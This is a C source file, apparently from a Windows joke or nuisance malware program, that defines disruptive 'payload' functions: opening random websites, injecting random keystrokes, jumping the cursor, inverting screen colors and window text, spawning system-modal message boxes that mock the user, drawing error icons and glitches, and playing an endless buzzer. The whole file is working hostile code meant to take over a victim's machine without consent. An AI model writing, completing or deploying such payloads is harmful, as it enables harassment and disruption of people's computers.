#include <payload_function.h>
#include <data.h>
#include <util.h>

#include <stdio.h> //


void shell_execute(window_t* w)
{
    ShellExecuteA(NULL, "open", (LPCSTR)sites[random() % sites_size], NULL, NULL, SW_SHOWDEFAULT);
    printf("shell_execute\n");
}

void keyboard_malfunction(window_t* w)
{
    DWORD rnd = (random() % (0x5a - 0x30)) + 0x30;

    INPUT input;
    input.type = INPUT_KEYBOARD;
    input.ki.wVk = rnd;

    SendInput(1, &input, sizeof(INPUT));
    printf("keyboard_malfunction\n");
}

void cursor_malfunction(window_t* w)
{
    POINT cursor;
    GetCursorPos(&cursor);

    SetCursorPos(
        cursor.x + (random() % 3 - 1) * (random() % 1000),
        cursor.y + (random() % 3 - 1) * (random() % 1000)
    );
}

void invert_colors(window_t* w)
{
    int x = w->rect.right - w->rect.left;
    int y = w->rect.bottom - w->rect.top;
    BitBlt(w->hdc, 0, 0, x, y, w->hdc, 0, 0, NOTSRCCOPY);
}

static BOOL CALLBACK enum_child_proc(HWND hwnd, LPARAM lParam)
{
    LPWSTR str = (LPWSTR)GlobalAlloc(GMEM_ZEROINIT, sizeof(WCHAR) * 8192);

    if (SendMessageTimeoutW(hwnd, WM_GETTEXT, 8192, (LPARAM)str, SMTO_ABORTIFHUNG, 100, NULL))
    {
        reverse_string_w(str);
        SendMessageTimeoutW(hwnd, WM_SETTEXT, 0, (LPARAM)str, SMTO_ABORTIFHUNG, 100, NULL);
    }

    GlobalFree(str);

    return TRUE;
}

void invert_text(window_t* w)
{
    EnumChildWindows(w->hwnd, &enum_child_proc, 0);
}

void play_sound(window_t* w)
{
    PlaySoundA(sounds[random() % sounds_size], GetModuleHandle(NULL), SND_SYNC);
}

static LRESULT CALLBACK msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HCBT_CREATEWND) {
        CREATESTRUCT *pcs = ((CBT_CREATEWND *)lParam)->lpcs;

        if ((pcs->style & WS_DLGFRAME) || (pcs->style & WS_POPUP)) {
            //HWND hwnd = (HWND)wParam;

            int x = random() % (GetSystemMetrics(SM_CXSCREEN) - pcs->cx);
            int y = random() % (GetSystemMetrics(SM_CYSCREEN) - pcs->cy);

            pcs->x = x;
            pcs->y = y;
        }
    }

    return CallNextHookEx(0, nCode, wParam, lParam);
}

static DWORD WINAPI messageBoxThread(LPVOID parameter)
{
    HHOOK hook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
    MessageBoxW(NULL, L"Still using this computer?", L"lol", MB_SYSTEMMODAL | MB_OK | MB_ICONWARNING);
    UnhookWindowsHookEx(hook);

    return 0;
}

void message_boxes(window_t* w)
{
    CreateThread(NULL, 4096, &messageBoxThread, NULL, 0, NULL);
}

void draw_icons(window_t* w)
{
    int ix = GetSystemMetrics(SM_CXICON) / 2;
    int iy = GetSystemMetrics(SM_CYICON) / 2;

    POINT cursor;
    GetCursorPos(&cursor);

    DrawIcon(w->hdc, cursor.x - ix, cursor.y - iy, LoadIcon(NULL, IDI_ERROR));

    int x = w->rect.right - w->rect.left;
    int y = w->rect.bottom - w->rect.top;

    if (random() % (int)(10/(1000/500.0+1)+1) == 0)
    {
        DrawIcon(w->hdc, random()%(x-ix), random()%(y-iy), LoadIcon(NULL, IDI_WARNING));
    }
}

void tunnel_vision(window_t* w)
{
    int x = w->rect.right - w->rect.left;
    int y = w->rect.bottom - w->rect.top;

    StretchBlt(w->hdc, 50, 50, x - 100, y - 100, w->hdc, 0, 0, x, y, SRCCOPY);
}

void screen_glitches(window_t* w)
{
    int x1 = random() % (w->rect.right - w->rect.left - 400);
    int y1 = random() % (w->rect.bottom - w->rect.top - 400);
    int x2 = random() % (w->rect.right - w->rect.left - 400);
    int y2 = random() % (w->rect.bottom - w->rect.top - 400);
    int width = random() % 400;
    int height = random() % 400;

    BitBlt(w->hdc, x1, y1, width, height, w->hdc, x2, y2, SRCCOPY);
}

void buzzer(window_t* w)
{
	WAVEFORMATEX fmt = { WAVE_FORMAT_PCM, 1, 44100, 44100, 1, 8, 0 };

	HWAVEOUT hwo;
	waveOutOpen(&hwo, WAVE_MAPPER, &fmt, 0, 0, CALLBACK_NULL);

	const int bufsize = 44100 * 30; // 30 Seconds
	char *wavedata = (char *)LocalAlloc(0, bufsize);

	WAVEHDR hdr = { wavedata, bufsize, 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hwo, &hdr, sizeof(hdr));

	for (;;)
    {
        int freq = 0;
        for (int i = 0; i < bufsize; i++)
        {
            if (i % (44100 / 4) == 0)
                freq = 44100 / ((random() % 4000) + 1000);

            wavedata[i] = (char)(((i % freq) / ((float)freq)) * 100);
        }

        waveOutWrite(hwo, &hdr, sizeof(hdr));

        while (!(hdr.dwFlags & WHDR_DONE))
            Sleep(1);

    }
}